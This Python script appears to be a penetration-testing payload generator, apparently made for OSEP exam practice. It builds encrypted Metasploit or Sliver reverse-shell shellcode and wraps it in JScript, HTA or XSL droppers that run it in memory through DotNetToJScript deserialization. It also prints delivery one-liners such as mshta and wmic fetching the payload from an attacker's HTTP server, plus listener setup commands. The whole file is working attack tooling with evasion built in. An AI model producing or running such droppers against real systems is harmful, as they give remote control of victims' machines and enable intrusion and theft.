#!/usr/bin/env python3
import os
import sys
import argparse
import base64
import random
import string
import subprocess
import re
from rich.console import Console
from rich.table import Table

console = Console()

BANNER = r"""
[bold orange3]      ██╗███████╗ ██████╗██████╗ ██╗██████╗ ████████╗[/bold orange3][bold blue]  ██████╗ ███████╗███╗   ██╗[/bold blue]
[bold orange3]      ██║██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝[/bold orange3][bold blue] ██╔════╝ ██╔════╝████╗  ██║[/bold blue]
[bold orange3]      ██║███████╗██║     ██████╔╝██║██████╔╝   ██║   [/bold orange3][bold blue] ██║  ███╗█████╗  ██╔██╗ ██║[/bold blue]
[bold orange3] ██   ██║╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   [/bold orange3][bold blue] ██║   ██║██╔══╝  ██║╚██╗██║[/bold blue]
[bold orange3] ╚██████║███████║╚██████╗██║  ██║██║██║        ██║   [/bold orange3][bold blue] ╚██████╔╝███████╗██║ ╚████║[/bold blue]
[bold orange3]  ╚═════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   [/bold orange3][bold blue]  ╚═════╝ ╚══════╝╚═╝  ╚═══╝[/bold blue]
[bold cyan]                         --- OSEP READY-FIRE ARSENAL ---[/bold cyan]
[bold black]                   Developed by: q3alique | Version: 2.0[/bold black]
"""

# Base Directory Configuration
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DOTNETTOJS_EXE = "/home/kali/DATOS/OSEP/Jscript/DotNetToJScript-master/DotNetToJScript-master/DotNetToJScript/bin/Release/DotNetToJScript.exe"

def print_help():
    console.print(BANNER)
    table = Table(show_header=False, box=None, padding=(0, 2))
    table.add_column("Option", style="bold yellow", width=35)
    table.add_column("Description", style="white")
    table.add_row("\n[bold cyan]Payload Configuration[/bold cyan]", "")
    table.add_row("-p, --payload [green]TYPE[/green]", "Raw shellcode (.bin), C# DLL, (msf) or (sliver)")
    table.add_row("--msf-payload [green]NAME[/green]", "MSF payload [default: windows/x64/meterpreter/reverse_https]")
    table.add_row("--proto [green]{tcp,http,https}[/green]", "Protocol for Sliver (default: tcp)")
    table.add_row("--is-assembly", "Set if the input payload is a C# DLL")
    table.add_row("-f, --format [green]EXT[/green]", "Output format (js, hta, xsl, txt) [default: js]")
    
    table.add_row("\n[bold cyan]Network Configuration (for MSF/Sliver)[/bold cyan]", "")
    table.add_row("--lhost [green]IP[/green]", "Local IP for shellcode")
    table.add_row("--lport [green]PORT[/green]", "Local Port for shellcode")
    table.add_row("--server-ip [green]IP[/green]", "Your HTTP server IP (for execution examples)")
    
    table.add_row("\n[bold cyan]General[/bold cyan]", "")
    table.add_row("-o, --output [green]FILE[/green]", "Output filename (saved in output/ dir)")
    table.add_row("-h, --help", "Show this help message and exit")
    console.print(table)
    console.print("\n[bold cyan]Usage Examples:[/bold cyan]")
    console.print("  jscriptgen.py -p msf --lhost 10.10.10.10 --lport 4444 -f hta")
    console.print("  jscriptgen.py -p sliver --lhost 10.10.10.10 --lport 4444 --proto http\n")

# XOR + ROT Encoding
def encrypt(data, key, rot):
    encrypted = bytearray()
    for b in data:
        # 1. ROT
        b = (b + rot) & 0xFF
        # 2. XOR
        b = b ^ key
        encrypted.append(b)
    return encrypted

def compile_bridge():
    bridge_source = os.path.join(SCRIPT_DIR, "templates", "bridge.cs")
    bridge_dll = "/tmp/bridge.dll"
    
    if not os.path.exists(bridge_source):
        console.print(f"[red][!] Bridge source not found: {bridge_source}[/red]")
        return None
        
    console.print(f"[*] Compiling Bridge DLL: [cyan]{bridge_source}[/cyan]")
    try:
        subprocess.run(["mcs", "-target:library", f"-out:{bridge_dll}", bridge_source], capture_output=True, text=True, check=True)
        return bridge_dll
    except Exception as e:
        console.print(f"[red][!] Error compiling bridge: {e}[/red]")
        return None

def serialize_dll(dll_path):
    temp_output = "/tmp/dotnettojs_out.js"
    
    if not os.path.exists(DOTNETTOJS_EXE):
        console.print(f"[red][!] DotNetToJScript not found: {DOTNETTOJS_EXE}[/red]")
        return None
        
    try:
        # Use -o to write directly to a file for a clean output
        subprocess.run(["mono", DOTNETTOJS_EXE, dll_path, "-c", "Runner", "-l", "JScript", f"-o={temp_output}"], capture_output=True, text=True, check=True)
        
        with open(temp_output, "r") as f:
            output = f.read()
            
        # Extract everything between 'serialized_obj =' and 'var entry_class'
        match = re.search(r'serialized_obj\s*=\s*(.*?);\s*var\s+entry_class', output, re.DOTALL)
        if match:
            block = match.group(1)
            parts = re.findall(r'"([^"]*)"', block)
            full_b64 = "".join(parts).replace("\n", "").replace("\r", "").strip()
            
            chunk_size = 70
            chunks = [full_b64[i:i+chunk_size] for i in range(0, len(full_b64), chunk_size)]
            
            js_array = ",\n".join([f'"{c}"' for c in chunks if c])
            return f"[\n{js_array}\n].join('')"
        
        console.print("[red][!] Could not parse serialized_obj from DotNetToJScript output file[/red]")
        return None
    except Exception as e:
        console.print(f"[red][!] Error during serialization: {e}[/red]")
        return None
    finally:
        if os.path.exists(temp_output):
            os.remove(temp_output)


def generate_msf_shellcode(payload, lhost, lport):
    if not lhost or not lport:
        console.print("[red][!] Error: --lhost and --lport required for msf payload.[/red]")
        return None
    
    console.print(f"[*] Generating MSF shellcode ([cyan]{payload}[/cyan])...")
    cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f raw"
    try:
        result = subprocess.run(cmd.split(), capture_output=True, check=True)
        return result.stdout
    except Exception as e:
        console.print(f"[red][!] Error generating msfvenom shellcode: {e}[/red]")
        return None

def generate_sliver_shellcode(lhost, lport, proto="tcp"):
    if not lhost or not lport:
        console.print("[red][!] Error: --lhost and --lport required for sliver payload.[/red]")
        return None

    msf_payload = f"windows/x64/custom/reverse_{proto}"
    if proto == "http":
        msf_payload = "windows/x64/custom/reverse_winhttp"
    elif proto == "https":
        msf_payload = "windows/x64/custom/reverse_winhttps"

    console.print(f"[*] Generating Sliver CUSTOM stager ([cyan]{msf_payload}[/cyan])...")
    cmd = ["msfvenom", "-p", msf_payload, f"LHOST={lhost}", f"LPORT={lport}", "EXITFUNC=thread"]
    
    if proto in ["http", "https"]:
        rand_uri = "/" + "".join(random.choice(string.ascii_lowercase) for _ in range(8)) + ".woff"
        cmd.append(f"LURI={rand_uri}")

    cmd.extend(["-f", "raw"])
    
    try:
        result = subprocess.run(cmd, capture_output=True, check=True)
        return result.stdout
    except Exception as e:
        console.print(f"[red][!] Error generating sliver shellcode: {e}[/red]")
        return None

def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-p", "--payload")
    parser.add_argument("--msf-payload", default="windows/x64/meterpreter/reverse_https")
    parser.add_argument("--proto", choices=["tcp", "http", "https"], default="tcp")
    parser.add_argument("--is-assembly", action="store_true")
    parser.add_argument("-f", "--format", choices=["js", "hta", "xsl", "txt"], default="js")
    parser.add_argument("--lhost")
    parser.add_argument("--lport")
    parser.add_argument("--server-ip")
    parser.add_argument("-o", "--output")
    parser.add_argument("-h", "--help", action="store_true")
    
    args = parser.parse_args()
    
    if args.help or not args.payload:
        print_help()
        return

    # Ensure output dir exists
    output_dir = os.path.join(SCRIPT_DIR, "output")
    os.makedirs(output_dir, exist_ok=True)
    
    # 1. Load Payload
    payload_data = None
    if args.payload == "msf":
        payload_data = generate_msf_shellcode(args.msf_payload, args.lhost, args.lport)
    elif args.payload == "sliver":
        payload_data = generate_sliver_shellcode(args.lhost, args.lport, args.proto)
    else:
        try:
            with open(args.payload, "rb") as f:
                payload_data = f.read()
        except Exception as e:
            console.print(f"[red][!] Error reading payload: {e}[/red]")
            return

    if not payload_data: return
    console.print(f"[*] Payload size: [cyan]{len(payload_data)} bytes[/cyan]")

    # 2. Generate keys and encrypt
    key = random.randint(1, 255)
    rot = random.randint(1, 255)
    encrypted_payload = encrypt(payload_data, key, rot)
    payload_b64 = base64.b64encode(encrypted_payload).decode()
    
    # 3. Prepare the Bridge
    bridge_dll = compile_bridge()
    if not bridge_dll: return
    
    serialized_obj_script = serialize_dll(bridge_dll)
    if not serialized_obj_script:
        console.print("[red][!] Failed to get serialized object from DotNetToJScript[/red]")
        return
    
    # 4. Final JS Logic
    final_js = f"""
function setversion() {{
    new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}}

function base64ToStream(b) {{
    var enc = new ActiveXObject("System.Text.ASCIIEncoding");
    var length = enc.GetByteCount_2(b);
    var ba = enc.GetBytes_4(b);
    var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
    ba = transform.TransformFinalBlock(ba, 0, length);
    var ms = new ActiveXObject("System.IO.MemoryStream");
    ms.Write(ba, 0, (length / 4) * 3);
    ms.Position = 0;
    return ms;
}}

function Base64ToBytes(b64) {{
    var xml = new ActiveXObject("MSXML2.DOMDocument");
    var element = xml.createElement("Base64Data");
    element.dataType = "bin.base64";
    element.text = b64;
    return element.nodeTypedValue;
}}

var serialized_obj = {serialized_obj_script};
var encrypted_payload = "{payload_b64}";
var key = {key};
var rot = {rot};
var is_assembly = {"true" if args.is_assembly else "false"};

try {{
    setversion();
    var stm = base64ToStream(serialized_obj);
    var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
    var al = new ActiveXObject('System.Collections.ArrayList');
    var d = fmt.Deserialize_2(stm);
    al.Add(undefined);
    var runner = d.DynamicInvoke(al.ToArray()).CreateInstance('Runner');
    
    var payload_bytes = Base64ToBytes(encrypted_payload);
    
    if (is_assembly) {{
        runner.ExecuteAssembly(payload_bytes, key, rot, null);
    }} else {{
        runner.ExecuteShellcode(payload_bytes, key, rot);
    }}
}} catch (e) {{
    WScript.Echo("Error: " + e.message);
}}
"""
    
    # 5. Handle Final Format
    final_output = ""
    ext = ""
    if args.format == "js" or args.format == "txt":
        final_output = final_js
        ext = args.format
    elif args.format == "hta":
        hta_template_path = os.path.join(SCRIPT_DIR, "templates", "delivery", "hta_template.xml")
        with open(hta_template_path, "r") as f:
            hta_template = f.read()
        final_output = hta_template.replace("#JS_CODE#", final_js)
        ext = "hta"
    elif args.format == "xsl":
        xsl_template_path = os.path.join(SCRIPT_DIR, "templates", "delivery", "xsl_template.xml")
        with open(xsl_template_path, "r") as f:
            xsl_template = f.read()
        final_output = xsl_template.replace("#JS_CODE#", final_js)
        ext = "xsl"

    
    # 6. Save output
    out_file = args.output if args.output else f"payload.{ext}"
    out_path = os.path.join(output_dir, out_file)
    
    with open(out_path, "w") as f:
        f.write(final_output)
        
    console.print(f"[green][+] Payload generated successfully: [white]{out_path}[/white][/green]")

    # 7. Print Execution Instructions
    server_ip = args.server_ip if args.server_ip else (args.lhost if args.lhost else "SERVER_IP")
    
    console.print("\n[bold cyan]─── EXECUTION INSTRUCTIONS ───[/bold cyan]")
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Delivery", style="yellow")
    table.add_column("One-Liner / Command", style="white")
    
    if args.format == "js":
        table.add_row("WScript", f"wscript.exe {out_file}")
        table.add_row("Remote (Cscript)", f"cscript.exe //e:jscript \\\\{server_ip}\\share\\{out_file}")
    elif args.format == "txt":
        table.add_row("Cscript", f"cscript.exe //e:jscript {out_file}")
        table.add_row("Remote", f"cscript.exe //e:jscript http://{server_ip}/{out_file}")
    elif args.format == "hta":
        table.add_row("Local MSHTA", f"mshta.exe {os.path.abspath(out_path)}")
        table.add_row("Remote MSHTA", f"mshta.exe http://{server_ip}/{out_file}")
    elif args.format == "xsl":
        table.add_row("WMIC (Local)", f"wmic process get /FORMAT:{out_file}")
        table.add_row("WMIC (Remote)", f"wmic process get /FORMAT:\"http://{server_ip}/{out_file}\"")
    
    console.print(table)
    
    if args.format in ["hta", "xsl", "txt"]:
        console.print(f"\n[*] [bold]Host your payload:[/bold] python3 -m http.server 80 (Run from {output_dir})")

    if args.payload == "msf":
        console.print(f"\n[bold yellow][!] Recommended MSF Listener:[/bold yellow]")
        console.print(f"    msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {args.msf_payload}; set LHOST {args.lhost}; set LPORT {args.lport}; set ExitOnSession false; run -j'")
    elif args.payload == "sliver":
        console.print(f"\n[bold yellow][!] Sliver Session Setup (Metasploit Compatibility):[/bold yellow]")
        console.print(f"    1. [bold cyan]Create Profile:[/bold cyan] profiles new --mtls {args.lhost} --arch amd64 --format shellcode sliver_x64")
        console.print(f"    2. [bold cyan]Start Stage Listener:[/bold cyan] stage-listener --url {args.proto}://{args.lhost}:{args.lport} --profile sliver_x64 --prepend-size")
        console.print(f"    3. [bold cyan]Verify jobs:[/bold cyan] jobs")


if __name__ == "__main__":
    main()
